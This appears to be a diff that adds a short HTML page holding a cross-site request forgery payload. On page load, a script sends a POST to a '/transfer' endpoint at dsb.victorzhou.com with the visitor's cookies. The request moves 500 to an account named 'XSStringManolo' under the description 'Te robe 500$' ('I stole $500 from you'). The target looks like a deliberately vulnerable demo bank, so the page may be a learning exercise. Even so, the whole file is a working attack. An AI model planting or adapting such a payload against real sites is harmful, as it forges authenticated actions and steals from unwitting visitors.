@@ -1,0 +1,15 @@
+<html>
+<body>
+Hola xD
+<script>
+const body = new URLSearchParams('amount=500&description=Te robe 500$&to=XSStringManolo');
+fetch('https://dsb.victorzhou.com/transfer', {
+  body,
+  credentials: 'include', // include cookies, despite being a cross-origin request
+  method: 'post',
+  mode: 'no-cors',
+});
+</script>
+
+</body>
+</html>
